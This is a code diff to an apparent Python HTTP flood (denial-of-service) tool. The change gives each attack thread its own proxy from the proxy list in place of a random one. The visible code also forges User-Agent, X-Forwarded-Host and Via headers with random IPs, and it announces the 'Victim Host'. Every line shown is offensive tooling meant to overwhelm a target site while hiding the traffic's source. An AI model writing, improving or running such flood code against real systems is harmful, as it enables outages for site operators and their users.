@@ -125,8 +125,11 @@ def GenUA():
     elif borwser =="uc":
         return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW
 
-def flood():
-    proxy = random.choice(proxies).strip().split(":")
+def flood(x):
+    if x < len(proxies):
+        proxy = proxies[x].strip().split(":")
+    else:
+        proxy = random.choice(proxies).strip().split(":")
     proto = "X-Forwarded-Proto: Http\r\n"
     x_host = "X-Forwarded-Host: " + host + "\r\n"
     via = "Via: " + ranip() + "\r\n"
@@ -323,8 +326,8 @@ for _ in range(thr):
     ua = GenUA()
     useragents.append(ua)
 
-for _ in range(thr):
-    threading.Thread(target=flood, daemon=True).start()
+for x in range(thr):
+    threading.Thread(target=flood, daemon=True, args=(x,)).start()
 
 print("\nVictim Host Set As => %s \n" %(host))
 time.sleep(1)
